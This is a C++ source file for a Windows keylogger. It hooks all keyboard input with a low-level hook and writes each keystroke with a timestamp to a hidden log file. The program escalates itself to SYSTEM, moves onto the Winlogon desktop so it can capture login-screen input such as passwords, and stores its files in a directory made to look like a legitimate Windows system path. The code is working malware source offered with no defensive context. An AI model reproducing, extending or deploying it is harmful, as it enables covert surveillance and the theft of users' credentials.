#include <iostream>
#include <windows.h>
#include "functions.h"

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	int msg = 1 + (kbdStruct.scanCode << 16) + (kbdStruct.flags << 24);
	char keyName[64]{};
	GetKeyNameTextA(msg, keyName, 64);
	char keyState[16]{};
	switch (wParam)
	{
	case WM_KEYUP:
		strncpy_s(keyState, "Key Up\0", 16);
		break;
	case WM_KEYDOWN:
		strncpy_s(keyState, "Key Down\0", 16);
		break;
	case WM_SYSKEYUP:
		strncpy_s(keyState, "Sys Key Up\0", 16);
		break;
	case WM_SYSKEYDOWN:
		strncpy_s(keyState, "Sys Key Down\0", 16);
		break;
	}

	std::string ResultLog;
	ResultLog.append(keyName);
	ResultLog.append(" \t ");
	ResultLog.append(keyState);
	ResultLog.append(" \t ");
	ResultLog.append(GetCurrentTimeAsString());
	ResultLog.append("\n");
	WriteKeyLogToLogFileSystemHidden(ResultLog);

	return CallNextHookEx(0, nCode, wParam, lParam);;
}


INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	bool IsRunningAsSystem = isRunningAsSystem();


	if (!IsRunningAsSystem) if (!RelaunchAsSystem(GetCommandLineW()))
	{
		// For logging
		return 1;
	}
	else return 0;


	if (GetCurrentDesktopName() == L"Default") if (!RelaunchWithWINLOGONDesktop(GetCommandLineW()))
	{
		// For logging
		return 2;
	}
	else return 0;

	CreateDirectoryRecursive(LR"(C:\Windows\IdentityCRL\production)");

	SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	while (GetMessageA(0, 0, 0, 0));
}